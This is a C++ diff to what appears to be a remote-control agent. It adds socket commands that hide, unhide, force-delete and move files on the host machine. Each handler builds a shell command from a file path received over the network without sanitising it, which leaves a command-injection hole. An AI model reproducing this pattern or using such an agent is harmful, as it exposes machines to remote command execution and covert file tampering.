@@ -168,7 +168,103 @@ bool changeIp(SocketManager & socketManager, SOCKET & socket)
 	return connected;
 }
 
+string changeAttrib(string filePath, string attrib)
+{
+	string command = "attrib " + attrib + " \"" + filePath + "\"";
 
+	//executes the command
+	std::string w = exec(command.c_str());
+
+	return w;
+}
+
+void showHiddenFile(SocketManager & socketManager, SOCKET & socket)
+{
+	int result;
+	char recvbuf[DEFAULT_BUFLEN * 4];
+	//get directory
+
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
+
+	string filePath = string(recvbuf);
+	
+	//executes the command
+	std::string w = changeAttrib(filePath, "-H");
+
+	if (w.size() == 0)
+	{
+		w = "success";
+	}
+
+	//send result
+	result = socketManager.send_data(socket, w.c_str());
+}
+
+void hideFile(SocketManager & socketManager, SOCKET & socket)
+{
+	int result;
+	char recvbuf[DEFAULT_BUFLEN * 4];
+	//get directory
+
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
+
+	string filePath = string(recvbuf);
+
+	//executes the command
+	std::string w = changeAttrib(filePath, "+H");
+
+	if (w.size() == 0)
+	{
+		w = "success";
+	}
+
+	//send result
+	result = socketManager.send_data(socket, w.c_str());
+}
+
+void deleteFile(SocketManager & socketManager, SOCKET & socket)
+{
+	int result;
+	char recvbuf[DEFAULT_BUFLEN * 4];
+	//get directory
+
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
+	string filePath = string(recvbuf);
+
+	string command = "del /f \"" + filePath + "\"";
+
+	//executes the command
+	std::string w = exec(command.c_str());
+
+	if (w.size() == 0)
+	{
+		w = "success";
+	}
+
+	//send result
+	result = socketManager.send_data(socket, w.c_str());
+}
+
+void moveFile(SocketManager & socketManager, SOCKET & socket)
+{
+	int result;
+	char recvbuf[DEFAULT_BUFLEN * 4];
+	//get directory
+
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
+	string filePath = string(recvbuf);
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
+	string dirToMove = string(recvbuf);
+
+
+	string command = "move \"" + filePath + "\" " + "\"" + dirToMove + "\\" + filePath + "\"";
+
+	//executes the command
+	std::string w = exec(command.c_str());
+
+	//send result
+	result = socketManager.send_data(socket, w.c_str());
+}
 //int main()
 //{
 //	string dir = "c:\\";
@@ -267,6 +363,22 @@ int main(int argc, char **argv)
 					else if (!strcmp(recvbuf, "FILE_SYSTEM_INFO"))//2, 6
 					{
 						dirInfo(socketManager, socket);
+					}
+					else if (!strcmp(recvbuf, "SHOW_HIDDEN_FILE"))//2, 6
+					{
+						showHiddenFile(socketManager, socket);
+					}
+					else if (!strcmp(recvbuf, "HIDE_FILE"))//2, 6
+					{
+						hideFile(socketManager, socket);
+					}
+					else if (!strcmp(recvbuf, "DELETE_FILE"))//2, 6
+					{
+						deleteFile(socketManager, socket);
+					}
+					else if (!strcmp(recvbuf, "MOVE_FILE"))//2, 6
+					{
+						moveFile(socketManager, socket);
 					}
 					else
 					{
